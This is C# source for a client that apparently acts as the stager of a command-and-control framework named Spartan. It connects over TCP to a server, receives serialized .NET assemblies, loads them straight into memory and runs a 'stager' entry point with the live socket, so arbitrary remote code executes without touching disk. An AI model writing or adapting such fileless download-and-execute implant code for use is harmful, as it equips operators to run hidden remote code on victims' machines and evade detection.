using System.Net.Sockets;
using System.Runtime.Loader;
using MessagePack;
using Spartan.Models;

namespace Spartan.Client;

class Program
{
    static void Main()
    {
        var tcpClient = new TcpClient("127.0.0.1", 12345);

        var networkStream = tcpClient.GetStream();

        var binaryReader = new BinaryReader(networkStream);
        var binaryWriter = new BinaryWriter(networkStream);
        //
        // var payloadLength = binaryReader.ReadInt32();
        // var payloadBytes = binaryReader.ReadBytes(payloadLength);
        
        using var dataStream = new MemoryStream();
        
        while (true)
        {
            var chunkSize = binaryReader.ReadInt32();
            if (chunkSize == 0) break; // End of file

            var chunk = binaryReader.ReadBytes(chunkSize);
            dataStream.Write(chunk, 0, chunk.Length);
        }

        var payloadBytes = dataStream.ToArray();

        // deserialize the payload
        var payload =
            MessagePackSerializer.Deserialize<Payload>(payloadBytes);

        var payloadName = payload.PayloadName;
        var payloadEntryPoint = payload.PayloadEntryPoint;
        var assemblyBinaries = payload.AssemblyBinaries;

        var payloadLoadContext = new AssemblyLoadContext("Payload");

        using var mainAssemblyStream = new MemoryStream(assemblyBinaries[payloadName]);
        var mainAssembly = payloadLoadContext.LoadFromStream(mainAssemblyStream);

        foreach (var (assemblyName, assemblyBinary) in assemblyBinaries)
        {
            if (assemblyName == payloadName)
            {
                continue;
            }

            using var assemblyStream = new MemoryStream(assemblyBinary);
            payloadLoadContext.LoadFromStream(assemblyStream);
        }

        // Instantiate and run the payload
        var stagerType = mainAssembly.GetType(payloadEntryPoint);
        var stagerInstance = Activator.CreateInstance(stagerType!, binaryReader, binaryWriter);
        dynamic stager = Convert.ChangeType(stagerInstance, stagerType!)!;

        stager.Run();

        // var mainAssemblyStream = new MemoryStream(Convert.FromBase64String(assemblyBinaries[pluginEntryPoint]));
        // var mainAssembly = assemblyLoadContext.LoadFromStream(mainAssemblyStream);
        //
        // // Load dependencies into the load context
        // foreach (var (assemblyName, assemblyBytes) in payload)
        // {
        //     var dependencyStream = new MemoryStream(Convert.FromBase64String(assemblyBytes));
        //     var assembly = payloadLoadContext.LoadFromStream(dependencyStream);
        //     if (assemblyName == "Spartan.Payload")
        //     {
        //         payloadAssembly = assembly;
        //     }
        // }
        //
        // // Instantiate and execute the payload
        // var pluginType = payloadAssembly.GetType("Spartan.Payload.SocketClient");
        // var pluginInstance = Activator.CreateInstance(pluginType, binaryReader, binaryWriter);
        // dynamic plugin = Convert.ChangeType(pluginInstance, pluginType);
        //
        // while (true)
        // {
        //     var data = Encoding.UTF8.GetString(plugin.ReceiveData());
        //     var response = $"You said: {data}";
        //     plugin.SendData(Encoding.UTF8.GetBytes(response));
        // }
    }
}

// class PayloadLoadContext : AssemblyLoadContext
// {
//     protected override Assembly Load(AssemblyName assemblyName)
//     {
//         // Prevent default loading from disk
//         return null;
//     }
// }